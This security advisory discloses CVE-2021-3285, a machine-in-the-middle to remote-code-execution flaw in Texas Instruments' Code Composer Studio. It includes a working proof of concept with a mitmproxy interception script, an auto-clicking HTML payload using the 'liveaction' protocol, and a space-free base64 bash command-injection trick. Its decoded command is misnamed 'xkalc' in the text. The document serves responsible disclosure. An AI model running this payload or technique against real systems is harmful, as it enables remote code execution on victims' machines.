---
layout: isl-entry
cveNumbers: ["CVE-2021-3285"]
islNumber: "ISL-2020-004"
ghAdvisories: []
excerpt: "The insecure configuration of [JxBrowser](https://www.teamdev.com/jxbrowser) in the \"Getting Started\" view of Code Composer Studio allows a machine-in-the-middle attack (MiTM) which can be escalated to remote code execution (RCE)."
title: "ISL-2020-004: RCE via MiTM in Texas Instruments' Code Composer Studio"
---

{% capture summary %}
The insecure configuration of [JxBrowser](https://www.teamdev.com/jxbrowser) in the "Getting Started" view of Code Composer Studio (CCS) allows a machine-in-the-middle attack (MiTM) which can be escalated to remote code execution (RCE).
{% endcapture %}

{% capture product %}
[Code Composer Studio](https://www.ti.com/tool/download/CCSTUDIO/)
{% endcapture %}

{% capture productVersion %}
[Code Composer Studio 10.0.0.00010](https://www.ti.com/tool/download/CCSTUDIO/10.0.0.00010)
{% endcapture %}

{% capture details %}
Texas Instruments' Code Composer Studio is an integrated development environment that supports TI's microcontroller (MCU) and embedded processor portfolios.

When CCS is first started it opens the "Getting Started" view:
![The "Getting Started" view of CCS is shown.]({{ "assets/images/isl-2020-004-texas-instruments-code-composer-studio_getting_started_view.png" | relative_url }})
This view uses [JxBrowser]((https://www.teamdev.com/jxbrowser)), a Java binding for the Chromium browser,  to show a YouTube playlist.
Unfortunately, JxBrowser before [version 6.24](https://jxbrowser-support.teamdev.com/release-notes/2019/v6-24.html) ignored certificate errors **by default**!

This trivially allows an attacker to perform a machine-in-the-middle attack, because any certificate will be accepted.

We can use [mitmproxy](https://mitmproxy.org/) to perform a machine-in-the-middle attack:
1. Download [this script]({{ "assets/files/isl-2020-004/interception_script.py" | relative_url }}) that will intercept the request.
2. Run `mitmproxy -s interception_script.py --listen-port 8080` in a terminal.
3. Run `export HTTPS_PROXY=http://localhost:8080`. So that CCS/JxBrowser will connect to `mitmproxy`.
4. Run `ccs/eclipse/ccstudio` to start CCS.
5. Navigate to "View" -> "Getting Started" if it doesn't open by default.
6. A calculator should pop up (**`kcalc` must be installed**).

What did we do to trigger the RCE?
Let's have a look at `interception_script.py`:
```python
def response(flow: http.HTTPFlow):
    ctx.log.info(flow.request.pretty_url)
    if (
        "https://www.youtube.com/embed/playlist?list=PL3NIKJ0FKtw77BTkTKo_OXYLaT0lL9_zc"
        in flow.request.pretty_url
    ):
        [...]
        custom_response = http.HTTPResponse.make(
            200,
            rceCausingResponse,  # <- replace with attack
            {},
        )
        flow.response.content = custom_response.content  # <- change the response
```
We are using the interception API provided by `mitmproxy` to check whether the requested URL is `https://youtube.com/embed/...`. If it is, we replace the HTTP response with our attack.\
The variable `rceCausingResponse` contains our attack and looks like this:
```python
rceCausingResponse = """[...]
<a target="_parent" id="foo"
href="liveaction:RunProgramAction(/usr/bin/bash -c '{echo,a2NhbGMK}|{base64,-d}|bash')"
>oh no</a>
<img src="null" onerror="document.querySelector('#foo').click()">
[...]
"""
```
The response consists of a link and an image with a `null` source.
The image's `onerror` handler will fire due to the `null` source which will then trigger a click on the link with the custom `liveaction` protocol!\
This protocol is implemented in `CCSIntroPart` by listening to changes to the browser location and calling `ResourceExplorerUtils.executeLiveAction` on the new location. The method `ResourceExplorerUtils.executeLiveAction` then checks whether the URL starts with the `liveaction` protocol.
```java
CCSIntroPart.this.browser.addLocationListener((LocationListener) new LocationListener() {
    public void changing(final LocationEvent event) {
        final String location = event.location;
        if (ResourceExplorerUtils.executeLiveAction(location,
            CCSIntroPart.this.browser.getUrl(), [...])) {
            event.doit = false;
            return;
        }
        [...]
    }
    [...]
});
```
The class name of the action, `RunProgramAction` in our case, and its arguments, `/usr/bin/bash -c '{echo,a2NhbGMK}|{base64,-d}|bash'`, will get extracted if the URL uses the `liveaction` protocol. The `RunProgramAction` class then gets instantiated which passes the arguments to `Runtime.getRuntime().exec()` like this:

`Runtime.getRuntime().exec("/usr/bin/bash -c '{echo,a2NhbGMK}|{base64,-d}|bash'", [...], [...]);`

Why does `'{echo,a2NhbGMK}|{base64,-d}|bash'` not look like a "normal" command, why are there no spaces?\
The overload of the `exec` method takes a `String` as its first argument which will then be **split by space into an array of `String`s**.
So if we had the command `/usr/bin/bash -c 'touch /tmp/owned'` it would be split into this array: [`"/usr/bin/bash"`, `"-c"`, `"'touch"`, `"/tmp/ownde'"`] which would fail to execute!

## Creating a Bash Command Without Spaces
How do we create a bash command without spaces? [Brace Expansion](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Brace-Expansion) to the rescue!
```bash
$ echo {he,llo,world}
he llo world
```
Brace expansion will helpfully add the spaces back for us :)

## Building the Final Command
We now know how to create a command without spaces and we only have to put all pieces together.
1. Encode the command we want to execute using Base64. We do this because it means we can easily use commands with spaces, because Base64 encodes any spaces. In our case we want to run `xkalc` which gets encoded as `a2NhbGMK`.
2. `{echo,a2NhbGMK}` will expand back to `echo a2NhbGMK` (via brace expansion).
3. This is then piped to `{base64,-d}` (expands to `base64 -d`) which decodes it back as `xkalc`.
4. And finally everything is piped to `bash`, executing `xkalc`.

This brings us to the final command `'{echo,a2NhbGMK}|{base64,-d}|bash'` as seen above.
{% endcapture %}

{% capture impact %}
RCE.
{% endcapture %}

{% capture disclosureTimeline %}
- 2020-07-28: Sent report to psirt@ti.com.
- 2020-09-21: CCS 10.1.1.00004 is released with a fix.
- 2021-01-26: CVE is assigned.
{% endcapture %}

{% include isl-entry.md %}
